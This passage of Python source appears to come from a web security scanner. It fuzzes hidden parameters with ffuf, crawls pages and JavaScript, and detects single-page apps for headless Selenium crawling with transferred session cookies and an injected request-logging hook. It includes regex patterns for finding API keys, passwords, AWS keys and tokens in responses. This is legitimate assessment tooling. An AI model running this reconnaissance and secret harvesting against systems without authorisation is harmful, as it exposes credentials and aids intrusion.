    if Path(param_wl).exists():
        # Baseline response for an obviously invalid parameter
        _p_baseline_len = 0
        try:
            _p_bl = sess.get(url, params={"_fracture_noparam_": "1"}, timeout=timeout)
            _p_baseline_len = len(_p_bl.content)
        except Exception:
            pass

        param_out = ffuf_dir / f"params_{host}_{port}.json"
        cmd = [
            ffuf, "-w", param_wl,
            "-u", f"{url}?FUZZ=fractureval",
            "-mc", "200,201",
            "-fs", str(_p_baseline_len),
            "-s",
            "-json", "-o", str(param_out),
            "-t", "40",
            "-timeout", str(timeout),
        ]
        vc.log(f"[ffuf] param discovery on {url}", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=180)
            _deregister_proc(proc)
            out.log_command("ffuf", cmd, param_out)
            if param_out.exists():
                try:
                    ffuf_data = json.loads(param_out.read_text(encoding="utf-8"))
                    for result in ffuf_data.get("results", []):
                        param = result.get("input", {}).get("FUZZ", "").strip()
                        status = result.get("status", 0)
                        rlen   = result.get("length", 0)
                        if not param:
                            continue
                        out.add_finding(
                            title=f"Hidden Parameter Discovered: {param}",
                            url=url, port=port, risk="LOW",
                            description=(
                                f"ffuf discovered undocumented GET parameter '{param}' at "
                                f"{url} (HTTP {status}, {rlen} bytes response)."
                            ),
                            output=f"Parameter: {param}\nURL: {url}?{param}=...\nStatus: {status}",
                            sources="ffuf", service=target["scheme"],
                            output_file=str(param_out),
                            affected=f"{url}?{param}=",
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation=(
                                "Review undocumented parameters for unintended functionality "
                                "or access control bypass opportunities."
                            ),
                        )
                        vc.log(f"[ffuf] param: {param} → {status}", "SUCCESS")
                except Exception:
                    pass
        except Exception as e:
            out.log_error("ffuf-params", cmd, str(e))
    else:
        vc.log(f"[ffuf] param wordlist not found: {param_wl} — skipping param fuzz", "WARNING")

    vc.status(phase, "ffuf", "complete", "Done", 2, 2)
    vc.log("[ffuf] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 3: Crawl
# ─────────────────────────────────────────────
_SECRET_PATTERNS = [
    (re.compile(r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9\-_]{16,})'),      "API Key"),
    (re.compile(r'(?i)(secret[_-]?key|secret)\s*[:=]\s*["\']?([A-Za-z0-9\-_]{16,})'),   "Secret Key"),
    (re.compile(r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']?([^\s"\']{6,})'),              "Password"),
    (re.compile(r'(?i)(access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']?([A-Za-z0-9\-_.]{16,})'), "Access Token"),
    (re.compile(r'(?i)aws[_-]?access[_-]?key[_-]?id\s*[:=]\s*["\']?(AKIA[A-Z0-9]{16})'), "AWS Access Key"),
    (re.compile(r'["\']?(eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)["\']?'), "JWT Token"),
    (re.compile(r'(?i)database[_-]?url\s*[:=]\s*["\']?((?:postgresql|mysql|mongodb)://[^\s"\']+)'), "Database URL"),
]
_INTERESTING_PATH_RE = re.compile(
    r'(?i)(/api/|/admin|/internal|/debug|/test|/backup|/old|/dev|/staging|/v\d+/)'
)
# Paths that should never be visited by the crawler when using an authenticated
# session — fetching these could invalidate the server-side session for all
# subsequent phases.
_LOGOUT_PATH_RE = re.compile(
    r'(?i)/(?:log[\-_]?out|sign[\-_]?out|log[\-_]?off|sign[\-_]?off|'
    r'session/(?:destroy|end|invalidate)|auth/(?:logout|signout)|'
    r'disconnect|deauth)(?:[/?#]|$)'
)


_JS_INTERNAL_URL_RE = re.compile(
    r'''(?:["'`])((?:/[a-zA-Z0-9_\-./]+(?:\?[^"'`\s]*)?)|(?:https?://[^"'`\s]+))(?:["'`])''',
)


def _extract_js_links(js_text: str, base_url: str) -> list:
    """Extract in-scope URL references from JavaScript source.

    Finds string literals that look like absolute or root-relative paths,
    filters to same-origin, deduplicates, and returns normalised URL strings.
    Only paths with a recognisable structure (/word or /word/…) are kept to
    avoid picking up regex patterns, CSS values, and other non-URL strings.
    """
    found: list = []
    for m in _JS_INTERNAL_URL_RE.finditer(js_text):
        candidate = m.group(1)
        norm = _normalize_url(base_url, candidate)
        if norm and _same_origin(base_url, norm):
            # Reject trivially short root paths that are likely not endpoints
            p = urllib.parse.urlparse(norm).path or "/"
            if len(p) > 1:
                found.append(norm)
    return found


def _crawl_page(page_url: str, sess: requests.Session,
                timeout: int, base_url: str) -> dict:
    result = {"links": [], "forms": [], "js_files": [], "error": None, "response": None}
    try:
        resp = sess.get(page_url, timeout=timeout, allow_redirects=True)
        result["response"] = resp
        ctype = resp.headers.get("Content-Type", "")

        # Handle JavaScript files: extract internal URL references and return.
        if "javascript" in ctype or page_url.split("?")[0].lower().endswith(".js"):
            result["links"] = _extract_js_links(resp.text, base_url)
            return result

        if "text/html" not in ctype:
            return result

        if not _BS4_AVAILABLE:
            result["links"] = [
                _normalize_url(page_url, h)
                for h in re.findall(r'href=["\']([^"\']+)["\']', resp.text)
                if _normalize_url(page_url, h)
            ]
            return result

        soup = BeautifulSoup(resp.text, "html.parser")

        # --- Hyperlinks and asset references ---------------------------------
        # <a href>, <link href>
        for tag in soup.find_all(["a", "link"]):
            href = tag.get("href", "")
            if href:
                norm = _normalize_url(page_url, href)
                if norm:
                    result["links"].append(norm)

        # <img src>, <iframe src>, <frame src>, <embed src>, <source src>
        for tag in soup.find_all(["img", "iframe", "frame", "embed", "source"]):
            for attr in ("src", "data-src"):
                val = tag.get(attr, "")
                if val:
                    norm = _normalize_url(page_url, val)
                    if norm and _same_origin(base_url, norm):
                        result["links"].append(norm)

        # <img srcset> — comma-separated list of "url [descriptor]" entries
        for tag in soup.find_all(attrs={"srcset": True}):
            for part in tag["srcset"].split(","):
                url_part = part.strip().split()[0] if part.strip() else ""
                if url_part:
                    norm = _normalize_url(page_url, url_part)
                    if norm and _same_origin(base_url, norm):
                        result["links"].append(norm)

        # data-href, data-url, data-action — common framework attributes
        for tag in soup.find_all(attrs=True):
            for attr in ("data-href", "data-url", "data-action", "data-link"):
                val = tag.get(attr, "")
                if val:
                    norm = _normalize_url(page_url, val)
                    if norm and _same_origin(base_url, norm):
                        result["links"].append(norm)

        # --- Forms -----------------------------------------------------------
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = [
                {"name": i.get("name", ""), "type": i.get("type", "text")}
                for i in form.find_all(["input", "textarea", "select"])
                if i.get("name")
            ]
            action_url = _normalize_url(page_url, action) if action else page_url
            result["forms"].append({
                "action": action_url,
                "method": method,
                "inputs": inputs,
            })
            # The form action endpoint itself is also a link worth visiting
            if action_url:
                result["links"].append(action_url)

        # --- Inline CSS url() references -------------------------------------
        for style_tag in soup.find_all("style"):
            for m in re.finditer(r'url\(["\']?([^)"\']+)["\']?\)', style_tag.get_text()):
                norm = _normalize_url(page_url, m.group(1))
                if norm and _same_origin(base_url, norm):
                    result["links"].append(norm)

        # --- Script tags -----------------------------------------------------
        # External scripts: collect for JS parsing
        for script in soup.find_all("script", src=True):
            src  = script.get("src", "")
            norm = _normalize_url(page_url, src) if src else None
            if norm and _same_origin(base_url, norm):
                result["js_files"].append(norm)

        # Inline scripts: extract internal URL references directly
        for script in soup.find_all("script"):
            if not script.get("src"):
                inline_text = script.get_text() or ""
                if inline_text:
                    for lnk in _extract_js_links(inline_text, base_url):
                        result["links"].append(lnk)

    except Exception as e:
        result["error"] = str(e)
    return result


def _crawl_output_path(root: Path, url: str) -> Path:
    """Return a directory-preserving path for a crawled resource.

    Structure: <root>/crawl/<hostname>/<scheme>/<url-path>
    e.g. https://10.10.240.1/internal/philosophy/admin.php
         → <root>/crawl/10.10.240.1/https/internal/philosophy/admin.php
    """
    parsed   = urllib.parse.urlparse(url)
    hostname = re.sub(r'[^a-zA-Z0-9._-]', '_', parsed.hostname or "unknown")
    scheme   = parsed.scheme or "http"
    raw_parts = [p for p in parsed.path.split("/") if p]
    safe_parts: list = []
    for part in raw_parts:
        safe = re.sub(r'[^\w.\-]', '_', part)
        if safe and safe not in (".", ".."):
            safe_parts.append(safe[:200])
    if not safe_parts:
        safe_parts = ["index"]
    dest = root / "crawl" / hostname / scheme / Path(*safe_parts)
    dest.parent.mkdir(parents=True, exist_ok=True)
    return dest


# ─────────────────────────────────────────────────────────────────────────────
# SPA detection and headless crawl
# ─────────────────────────────────────────────────────────────────────────────

_SPA_MOUNT_IDS = frozenset({
    # Standard SPA framework mount points
    "root", "app", "__nuxt", "__next", "vue-app", "ng-app",
    # Enterprise / portal shells
    "shell", "portal", "workspace", "application", "spa-root",
    "app-container", "app-wrapper", "app-root", "ui-root",
    "main-app", "view-container", "page-container", "content-container",
    # IBM / Cognos
    "cognos", "cognos-viewer", "content-pane", "bi-shell",
    # Ember
    "ember-application",
    # Blazor
    "blazor-app", "app-host",
    # Oracle / SAP
    "oracle-adf-container", "sapui5-content",
})

_SPA_SCRIPT_RE = re.compile(
    # Major open-source SPA frameworks
    r'react(?:\.development|\.production\.min)?\.js'
    r'|vue(?:\.common|\.esm-bundler|\.runtime\.dom|\.min)?\.js'
    r'|@angular/'
    r'|angular(?:\.min)?\.js'
    r'|_next/static'
    r'|nuxt(?:\.min)?\.js'
    r'|svelte(?:\.dev|\.min)?\.js'
    r'|ember(?:\.debug|\.min)?\.js'
    r'|backbone(?:\.min)?\.js'
    # Enterprise / proprietary frameworks
    r'|_framework/blazor'                              # Blazor WebAssembly
    r'|sap-ui-core'                                    # SAP Fiori / OpenUI5
    r'|openui5'                                        # OpenUI5 CDN
    r'|dojo(?:\.js|\.min\.js)'                        # Dojo toolkit (IBM, older enterprise)
    r'|ext(?:-all|-modern|-classic|-legacy)?(?:\.min)?\.js'  # Ext JS / Sencha
    r'|VAADIN/'                                        # Vaadin (Java enterprise)
    r'|knockout(?:\.min)?\.js'                         # Knockout.js (MVVM)
    r'|alpine(?:\.esm|\.min)?\.js'                    # Alpine.js
    r'|polymer(?:\.min)?\.js'                          # Polymer
    r'|lit(?:-element)?(?:\.min)?\.js'                # Lit
    r'|require(?:\.min)?\.js'                          # RequireJS (AMD loader — Cognos, Dojo apps)
    r'|ojs/'                                           # Oracle JET
    r'|\.nocache\.js'                                  # Google Web Toolkit (GWT)
    r'|mootools(?:\.min)?\.js'                         # MooTools (legacy enterprise)
    r'|yui(?:-min)?\.js|yui/'                         # YUI (legacy IBM/Yahoo)
    r'|dwr/'                                           # Direct Web Remoting (Java enterprise)
    r'|stimulus(?:\.min)?\.js'                         # Stimulus / Hotwire
    r'|htmx(?:\.min)?\.js'                            # HTMX
    r'|angular-ui-router',                             # AngularJS ui-router
    re.IGNORECASE,
)

_SPA_BUNDLE_RE = re.compile(
    r'(?:chunk|vendor|main|app|runtime|bundle)\.[a-f0-9]{6,20}(?:\.min)?\.js',
    re.IGNORECASE,
)

_SPA_INLINE_MARKERS = [
    # Standard frameworks
    ("__NEXT_DATA__",         "Next.js"),
    ("__NUXT__",              "Nuxt.js"),
    ("data-reactroot",        "React"),
    ("ng-version",            "Angular"),
    ("__VUE__",               "Vue"),
    ("window.Ember",          "Ember"),
    ("__svelte",              "Svelte"),
    # SSR hydration markers (page looks static but is client-hydrated)
    ("data-server-rendered",  "Vue SSR"),
    ("__vue_ssr_context__",   "Vue SSR"),
    ("data-n-head",           "Nuxt SSR"),
    ("__NUXT_FULL__",         "Nuxt SSR"),
    # History API — framework-agnostic SPA routing signal
    ("history.pushState",     "History API routing"),
    ("history.replaceState",  "History API routing"),
    ("window.onpopstate",     "History API routing"),
    # Enterprise frameworks
    ("sap-ui-config",         "SAP Fiori/OpenUI5"),
    ("sap.ui.getCore",        "SAP Fiori/OpenUI5"),
    ("sap.ui.define",         "SAP Fiori/OpenUI5"),
    ("Ext.application",       "Ext JS"),
    ("Ext.define",            "Ext JS"),
    ("ko.applyBindings",      "Knockout.js"),
    ("ko.observable",         "Knockout.js"),
    ("dojo.require",          "Dojo"),
    ("dojo.config",           "Dojo"),
    ("require.config",        "RequireJS"),
    ("VAADIN",                "Vaadin"),
    ("Blazor.start",          "Blazor"),
    ("DotNet.invokeMethod",   "Blazor"),
    # IBM
    ("CognosViewer",          "IBM Cognos"),
    ("cognos.Report",         "IBM Cognos"),
    ("cognosLaunchInWindow",  "IBM Cognos"),
    ("ibm.common",            "IBM JS framework"),
    # Oracle
    ("oracle.adf",            "Oracle ADF"),
    ("oracle.jet",            "Oracle JET"),
    # GWT
    ("GWT.create",            "Google Web Toolkit"),
    # Alpine.js
    ("Alpine.data",           "Alpine.js"),
    ("x-data=",               "Alpine.js"),
]

# onclick attribute pattern for DHTML / jQuery-era apps whose navigation
# is driven by JS handlers rather than <a href> links
_SPA_ONCLICK_NAV_RE = re.compile(
    r'(?:location\.href\s*[=+]|window\.location\s*[=+]|\.load\s*\(|'
    r'navigate\s*\(|showPage\s*\(|loadContent\s*\(|loadPage\s*\(|'
    r'changePage\s*\(|goTo\s*\(|renderView\s*\(|displayContent\s*\()',
    re.I,
)


def _detect_spa(html: str, url: str, static_link_count: int) -> "tuple[bool, list[str]]":
    """Heuristically determine whether the target is a Single Page Application.

    Returns (is_spa, evidence_list).  Called after the static crawl so that
    static_link_count reflects how many links were actually discovered without
    JS execution — a low count alongside heavy JS is a strong SPA signal.
    """
    if not html or not _BS4_AVAILABLE:
        return False, []

    evidence: list = []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return False, []

    # Mount-point IDs used by every major SPA framework
    for tag_id in _SPA_MOUNT_IDS:
        if soup.find(id=tag_id):
            evidence.append(f"SPA mount point: id='{tag_id}'")

    # Angular custom elements / ng-app directive
    if soup.find("app-root") or soup.find(attrs={"ng-app": True}):
        evidence.append("Angular app-root / ng-app directive")

    # Blazor: uses <app> as mount element (not an id — it's the tag name itself)
    if soup.find("app"):
        evidence.append("Blazor-style <app> mount element")

    # Known SPA framework script sources
    script_srcs = [s.get("src", "") for s in soup.find_all("script") if s.get("src")]
    for src in script_srcs:
        if _SPA_SCRIPT_RE.search(src):
            evidence.append(f"SPA framework script: {src.split('?')[0][-60:]}")
            break

    # Webpack / Vite hashed bundle pattern
    if any(_SPA_BUNDLE_RE.search(s) for s in script_srcs):
        evidence.append("Bundled JS chunks (webpack / vite)")

    # Inline markers embedded in the page HTML
    for marker, name in _SPA_INLINE_MARKERS:
        if marker in html:
            evidence.append(f"{name} inline indicator ({marker})")
            break

    # Near-empty body with multiple script tags (typical SPA shell)
    body = soup.find("body")
    if body:
        body_text = body.get_text(separator=" ", strip=True)
        child_els = sum(1 for c in body.children if hasattr(c, "name") and c.name)
        if len(body_text) < 100 and len(script_srcs) >= 2:
            evidence.append(
                f"Near-empty body ({len(body_text)} chars) with {len(script_srcs)} scripts"
            )
        elif child_els <= 3 and len(script_srcs) >= 3:
            evidence.append(
                f"Sparse body ({child_els} elements) with {len(script_srcs)} scripts"
            )

    # Very few static links despite heavy JS presence
    if static_link_count < 5 and len(script_srcs) >= 3:
        evidence.append(
            f"Only {static_link_count} static links with {len(script_srcs)} script tags"
        )

    # ES module <script type="module"> — used by Vite, SvelteKit, modern SSR setups
    module_scripts = [s for s in soup.find_all("script") if s.get("type") == "module"]
    if len(module_scripts) >= 2:
        evidence.append(f"{len(module_scripts)} ES module <script type=module> tags (Vite/modern SSR)")

    # History API in inline scripts — framework-agnostic SPA routing signal
    # (catches hand-rolled SPAs and custom portals that don't use a named framework)
    _inline_text = " ".join(s.get_text() for s in soup.find_all("script") if not s.get("src"))
    if "history.pushState" in _inline_text or "history.replaceState" in _inline_text:
        if not any("History API" in e for e in evidence):  # not already caught by inline marker
            evidence.append("History API (pushState/replaceState) in inline scripts")

    # DHTML / onclick-driven navigation — jQuery-era and enterprise portal apps
    # where navigation fires JS handlers rather than following <a href> links
    _onclick_nav_count = sum(
        1 for _el in soup.find_all(onclick=True)
        if _SPA_ONCLICK_NAV_RE.search(_el.get("onclick", ""))
    )
    if _onclick_nav_count >= 3:
        evidence.append(f"DHTML onclick navigation: {_onclick_nav_count} onclick-driven nav elements")
    elif _onclick_nav_count >= 1 and not evidence:
        evidence.append("onclick navigation handler detected")

    # data-* attribute density — heavy use of data-* bindings is a framework indicator
    # even when no known framework name appears in scripts or markers
    _data_attr_count = sum(
        1 for _tag in soup.find_all()
        if any(
            k.startswith("data-") and k not in ("data-src", "data-id", "data-type", "data-value")
            for k in (_tag.attrs or {})
        )
    )
    if _data_attr_count >= 20 and not evidence:
        evidence.append(f"{_data_attr_count} elements with data-* binding attributes (framework pattern)")

    # Known JS-driven enterprise platform URL signals — these platforms are always
    # JS-driven regardless of what the initial HTML contains, so the URL alone is
    # sufficient evidence to request headless rendering.
    _url_lower = (url or "").lower()
    _KNOWN_JS_URL_SIGS = [
        ("/ibmcognos/",   "IBM Cognos BI portal"),
        ("xts.run",       "IBM Cognos xts dispatcher"),
        ("/bi/v1/disp",   "IBM Cognos BI dispatcher"),
        ("/cgi-bin/cognos.cgi", "IBM Cognos SOAP/CGI dispatcher"),
        ("/oracle/adf/",  "Oracle ADF portal"),
        ("/faces/",       "Oracle ADF JSF"),
        ("/sap/bc/",      "SAP Fiori"),
        ("/sap/opu/",     "SAP OData service"),
        ("/ui5/",         "SAP UI5"),
    ]
    for _sig, _sig_name in _KNOWN_JS_URL_SIGS:
        if _sig in _url_lower and not any(_sig_name.split()[0] in e for e in evidence):
            evidence.append(f"Known JS-driven platform URL: {_sig_name}")
            break

    return bool(evidence), evidence


# ── SPA headless crawl interaction constants ─────────────────────────────────

_SPA_MAX_CLICKS = 30  # max click interactions per page during headless crawl

# CSS selector for elements that trigger navigation via JS rather than <a href>
_SPA_CLICK_SEL = (
    '[role="menuitem"],[role="tab"],[role="treeitem"],[role="option"],'
    '[role="button"]:not([disabled]),'
    'nav button,nav li[onclick],nav [onclick],'
    '.nav-item button,.menu-item,.nav-link[onclick],'
    'li[onclick],td[onclick],div[onclick],span[onclick],'
    '[data-href],[data-url],[data-route],[data-link],[data-page],'
    '[data-toggle="tab"],[data-toggle="pill"],[data-toggle="collapse"],'
    'button[data-href],button[data-url],button[data-route],'
    'a[onclick]:not([href]):not([href="#"]),'
    'a[href^="javascript:"],'
    '[data-id][onclick]'
)

# Injected into each page after load — intercepts XHR, fetch, and history API
# pushState/replaceState so click-triggered navigations are captured as routes
_SPA_INTERCEPT_JS = """
(function () {
    if (!window._fracture_net_urls) { window._fracture_net_urls = []; }
    if (window._fracture_intercepted) { return; }
    window._fracture_intercepted = true;
    var _op = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (m, u) {
        try { window._fracture_net_urls.push(String(u)); } catch (e) {}
        return _op.apply(this, arguments);
    };
    if (typeof window.fetch !== 'undefined') {
        var _of = window.fetch;
        window.fetch = function (input, init) {
            try {
                window._fracture_net_urls.push(
                    input instanceof Request ? input.url : String(input)
                );
            } catch (e) {}
            return _of.apply(this, arguments);
        };
    }
    var _ops = history.pushState;
    history.pushState = function (s, t, u) {
        try { if (u) window._fracture_net_urls.push(String(u)); } catch (e) {}
        return _ops.apply(this, arguments);
    };
    var _ors = history.replaceState;
    history.replaceState = function (s, t, u) {
        try { if (u) window._fracture_net_urls.push(String(u)); } catch (e) {}
        return _ors.apply(this, arguments);
    };
})();
"""


def _spa_transfer_cookies(sess: "requests.Session", driver: object,
                          base_url: str) -> None:
    """Copy all cookies from a requests.Session into a Selenium WebDriver.

    The driver must already be on the target origin before this is called —
    Selenium's same-origin cookie policy rejects additions to a foreign domain.
    """
    try:
        domain_hint = urllib.parse.urlparse(base_url).netloc.split(":")[0]
        for ck in sess.cookies:
            try:
                driver.add_cookie({   # type: ignore[attr-defined]
                    "name":   ck.name,
                    "value":  ck.value,
                    "domain": ck.domain or domain_hint,
                    "path":   ck.path   or "/",
                    "secure": bool(ck.secure),
                })
            except Exception:
                pass
    except Exception:
        pass


def _phase_spa_crawl(target: dict, cfg: dict, pm: "ProgressManager",
                     out: "OutputManager", sess: "requests.Session",
                     already_visited: int,
                     extra_seeds: "list[str] | None" = None) -> dict:
    """Headless-browser crawl for Single Page Applications.

    Tries Chrome first; falls back to Firefox (GeckoDriver) when Chrome or
    chromedriver is unavailable.  Session cookies are transferred so the crawl
    runs as the current credential context.

    Returns a partial crawl_data dict (same schema as _phase_crawl output)
    containing only the incremental results — the caller merges them.
    """
    phase      = "crawl"
    url        = target["url"]
    timeout    = cfg.get("timeout", 10)
    verify_ssl = cfg.get("verify_ssl", False)
    max_pages  = max(10, min(cfg.get("crawl_max_pages", 500) - already_visited, 200))

    spa_forms: list = []
    spa_links: list = []
    spa_js:    list = []
    visited:   set  = set()
    driver             = None

    browser = _get_spa_browser()
    if browser is None:
        vc.log("[crawl/spa] no headless browser available — skipping", "WARNING")
        return {}

    try:
        from selenium import webdriver
        from selenium.webdriver.support.ui import WebDriverWait
    except ImportError:
        vc.log("[crawl/spa] selenium not importable — skipping headless crawl", "WARNING")
        return {}

    try:
        if browser == "firefox":
            from selenium.webdriver.firefox.options import Options
            opts = Options()
            opts.add_argument("-headless")
            if not verify_ssl:
                opts.accept_insecure_certs = True
            ff_bin = _find_firefox_binary()
            if ff_bin:
                opts.binary = ff_bin
            service = _build_firefox_service()
            driver  = webdriver.Firefox(service=service, options=opts)
            vc.log("[crawl/spa] Using Firefox (GeckoDriver) for headless crawl", "INFO")
        else:
            from selenium.webdriver.chrome.options import Options
            opts = Options()
            opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--disable-extensions")
            opts.add_argument("--disable-notifications")
            opts.add_argument("--disable-popup-blocking")
            opts.add_argument("--log-level=3")
            opts.add_argument("--silent")
            if not verify_ssl:
                opts.add_argument("--ignore-certificate-errors")
                opts.add_argument("--allow-insecure-localhost")
            chrome_bin = _find_chrome_binary()
            if chrome_bin:
                opts.binary_location = chrome_bin
            service = _build_chrome_service()
            driver  = webdriver.Chrome(service=service, options=opts)
            vc.log("[crawl/spa] Using Chrome for headless crawl", "INFO")

        driver.set_page_load_timeout(max(timeout * 2, 60))
        driver.implicitly_wait(2)

        # Read target profile to detect JS-heavy platforms and tune timing
        _spa_settle_time = 2.5
        _spa_bi_tools: set = set()
        try:
            _spa_tp = json.loads((out.root / "target_profile.json").read_text())
            _spa_bi_tools = set(_spa_tp.get("bi_tools", [])) | set(_spa_tp.get("technologies", []))
        except Exception:
            pass
        _SLOW_HEADLESS_PLATFORMS = frozenset({
            "IBM Cognos", "Oracle ADF", "Oracle JET", "SAP Fiori", "Google Web Toolkit",
        })
        if _spa_bi_tools & _SLOW_HEADLESS_PLATFORMS:
            _spa_settle_time = 8.0
            vc.log(
                f"[crawl/spa] JS-heavy platform detected "
                f"({', '.join(_spa_bi_tools & _SLOW_HEADLESS_PLATFORMS)}) — "
                f"using {_spa_settle_time}s settle time",
                "INFO",
            )

        # Chrome: inject XHR/fetch/pushState interceptor as a pre-navigation script
        # so it captures requests fired during initial page load (before post-load injection)
        if browser == "chrome":
            try:
                driver.execute_cdp_cmd(
                    "Page.addScriptToEvaluateOnNewDocument",
                    {"source": _SPA_INTERCEPT_JS},
                )
            except Exception:
                pass

        # Navigate to origin first (required before cookie injection)
        try:
            driver.get(url)
        except Exception:
            pass
        driver.delete_all_cookies()
        _spa_transfer_cookies(sess, driver, url)

        # Detect if initial navigation landed on a login page.
        # This happens when the target immediately redirects to a login URL before
        # any cookies are set — the browser follows the redirect, ends up on the
        # login page, and cookie injection happens while on that page.
        # The loop's first driver.get(url) should recover because the auth cookies
        # are now set, but we log a warning so the outcome is visible.
        try:
            _setup_url = driver.current_url or ""
            if _WAF_LOGIN_URL_RE.search(_setup_url):
                vc.log(
                    f"[crawl/spa] Setup navigation redirected to login page ({_setup_url}). "
                    "Auth cookies injected — first loop navigation will attempt recovery.",
                    "WARNING",
                )
        except Exception:
            pass

        queue = [url]
        if extra_seeds:
            queue.extend(s for s in extra_seeds if s != url)

        # Add known application entry points for detected BI platforms
        if "IBM Cognos" in _spa_bi_tools:
            _cog_parsed = urllib.parse.urlparse(url)
            _cog_origin = f"{_cog_parsed.scheme}://{_cog_parsed.netloc}"
            _cog_base   = ""
            for _cp in ("/ibmcognos", "/cognos"):
                if _cp in url.lower():
                    _cog_base = _cp
                    break
            if _cog_base:
                _cog_seeds = [
                    f"{_cog_origin}{_cog_base}/bi/?perspective=portal",
                    f"{_cog_origin}{_cog_base}/bi/?perspective=administration",
                    f"{_cog_origin}{_cog_base}/bi/admin/",
                ]
                for _cs in _cog_seeds:
                    if _cs.rstrip("/") not in {q.rstrip("/") for q in queue}:
                        queue.append(_cs)
                vc.log(
                    f"[crawl/spa] IBM Cognos — added {len(_cog_seeds)} perspective seeds",
                    "INFO",
                )

        page_count = 0
        _spa_login_warned = False  # suppress repeated login-redirect warnings
        vc.status(phase, "Crawl", "running", "SPA headless crawl", 0, max_pages)

        while queue and page_count < max_pages:
            current = queue.pop(0)
            norm_c  = current.rstrip("/")
            if norm_c in visited:
                continue
            visited.add(norm_c)
            page_count += 1
            vc.status(phase, "Crawl", "running",
                      f"SPA page {page_count}", page_count, max_pages)

            # Navigate — do NOT bail on page-load timeout; Dojo/AMD apps may never
            # reach readyState 'complete' because AMD modules load asynchronously
            # after the initial document is parsed. A timeout leaves the browser on
            # a partially-rendered page that is still worth extracting links from.
            try:
                driver.get(current)
            except Exception:
                pass  # page-load timeout — partial content may still be extractable

            # Wait for readyState without blocking extraction on timeout
            try:
                WebDriverWait(driver, min(timeout, 15)).until(
                    lambda d: d.execute_script(  # type: ignore[union-attr]
                        "return document.readyState") == "complete"
                )
            except Exception:
                pass  # AMD-loading pages may never settle — proceed with what rendered

            time.sleep(_spa_settle_time)

            # Post-load interceptor injection — catches XHR/fetch/pushState calls
            # fired during click interactions and lazy-loaded route transitions
            try:
                driver.execute_script(_SPA_INTERCEPT_JS)
            except Exception:
                pass

            # Detect login redirect: if the target bounced us to a login page
            # after we navigated with auth cookies, the session may be invalid in
            # the headless browser. Re-inject cookies and retry once per scan.
            try:
                _cur_after = driver.current_url or ""
                if (_WAF_LOGIN_URL_RE.search(_cur_after)
                        and _cur_after.rstrip("/") != current.rstrip("/")):
                    if not _spa_login_warned:
                        _spa_login_warned = True
                        vc.log(
                            f"[crawl/spa] Redirected to login ({_cur_after}) after "
                            "navigating with auth cookies — session may be incompatible "
                            "with headless browser (User-Agent mismatch or cookie binding). "
                            "Re-injecting cookies and retrying.",
                            "WARNING",
                        )
                        driver.delete_all_cookies()
                        _spa_transfer_cookies(sess, driver, url)
                        try:
                            driver.get(current)
                        except Exception:
                            pass
                        try:
                            WebDriverWait(driver, min(timeout, 15)).until(
                                lambda d: d.execute_script(
                                    "return document.readyState") == "complete"
                            )
                        except Exception:
                            pass
                        time.sleep(_spa_settle_time)
                        try:
                            driver.execute_script(_SPA_INTERCEPT_JS)
                        except Exception:
                            pass
            except Exception:
                pass

            # Extract links from the rendered DOM (includes SPA router anchors
            # and framework data-* navigation attributes)
            try:
                raw_links = driver.execute_script("""
                    var sel = 'a[href],[data-href],[data-url],[data-link],[data-action]';
                    return Array.from(document.querySelectorAll(sel)).map(function(el){
                        return el.getAttribute('href')
                            || el.getAttribute('data-href')
                            || el.getAttribute('data-url')
                            || el.getAttribute('data-link')
                            || el.getAttribute('data-action') || '';
                    }).filter(Boolean);
                """) or []
                for raw in raw_links:
                    nl = _normalize_url(current, raw)
                    if (nl and _same_origin(url, nl)
                            and not _LOGOUT_PATH_RE.search(
                                urllib.parse.urlparse(nl).path or "")):
                        spa_links.append(nl)
                        if nl.rstrip("/") not in visited:
                            queue.append(nl)
            except Exception:
                pass

            # Extract forms from the rendered DOM
            try:
                raw_forms = driver.execute_script("""
                    return Array.from(document.forms).map(function(f){
                        return {
                            action: f.action || '',
                            method: (f.method || 'GET').toUpperCase(),
                            inputs: Array.from(f.elements)
                                .filter(function(e){ return e.name; })
                                .map(function(e){
                                    return {name: e.name, type: e.type || 'text'};
                                })
                        };
                    });
                """) or []
                for frm in raw_forms:
                    raw_action = frm.get("action", "") or current
                    norm_action = _normalize_url(current, raw_action) or current
                    if _same_origin(url, norm_action):
                        spa_forms.append({
                            "action": norm_action,
                            "method": frm.get("method", "GET"),
                            "inputs": frm.get("inputs", []),
                        })
                        if norm_action.rstrip("/") not in visited:
                            queue.append(norm_action)
            except Exception:
                pass

            # Collect script src URLs for JS secret scan
            try:
                js_srcs = driver.execute_script("""
                    return Array.from(document.scripts)
                        .map(function(s){ return s.src; })
                        .filter(Boolean);
                """) or []
                for js_src in js_srcs:
                    nj = _normalize_url(current, js_src)
                    if nj and _same_origin(url, nj):
                        spa_js.append(nj)
            except Exception:
                pass

            # Collect URLs captured by the XHR / fetch / history-API interceptor
            # (routes pushed via pushState during page init or after link clicks)
            try:
                _net_urls = driver.execute_script(
                    "return (window._fracture_net_urls || []).splice(0);"
                ) or []
                for _raw_nu in _net_urls:
                    _nl = _normalize_url(current, _raw_nu)
                    if (_nl and _same_origin(url, _nl)
                            and not _LOGOUT_PATH_RE.search(
                                urllib.parse.urlparse(_nl).path or "")
                            and _nl.rstrip("/") not in visited):
                        spa_links.append(_nl)
                        queue.append(_nl)
            except Exception:
                pass

            # Click-based route discovery — interact with nav elements that don't
            # use <a href>: tree nodes, tabs, DHTML onclick handlers, role=menuitem
            try:
                _clickable = driver.find_elements("css selector", _SPA_CLICK_SEL)
                _pre_click_url = driver.current_url
                for _cel in _clickable[:_SPA_MAX_CLICKS]:
                    try:
                        driver.execute_script(
